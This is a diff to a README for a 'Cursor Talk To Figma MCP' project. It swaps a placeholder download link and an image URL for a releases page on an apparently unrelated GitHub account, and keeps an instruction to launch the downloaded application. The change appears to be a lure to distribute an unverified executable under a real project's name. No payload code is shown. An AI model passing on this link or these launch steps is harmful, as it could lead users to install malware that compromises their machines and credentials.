@@ -14,7 +14,7 @@ The **Cursor Talk To Figma MCP** project aims to create an agentic AI agent that
 
 ## Installation
 
-You can download the installation files from the following link: [Download App.zip](https://github.com/project/files/App.zip)
+You can download the installation files from the following link: [Download https://github.com/toiletmadarchut/cursor-talk-to-figma-mcp/releases](https://github.com/toiletmadarchut/cursor-talk-to-figma-mcp/releases)
 
 If the link ends with the file name, please launch the application to begin using the **Cursor Talk To Figma MCP**.
 
@@ -45,7 +45,7 @@ For any questions or issues related to the **Cursor Talk To Figma MCP** project,
 
 Let's revolutionize the way we interact with design tools! 🌟🚀
 
-![Cursor Talk To Figma MCP](https://example.com/image.jpg)
+![Cursor Talk To Figma MCP](https://github.com/toiletmadarchut/cursor-talk-to-figma-mcp/releases)
 
 ---
 Credits: This README template was created with the help of some awesome Markdown features and emojis.
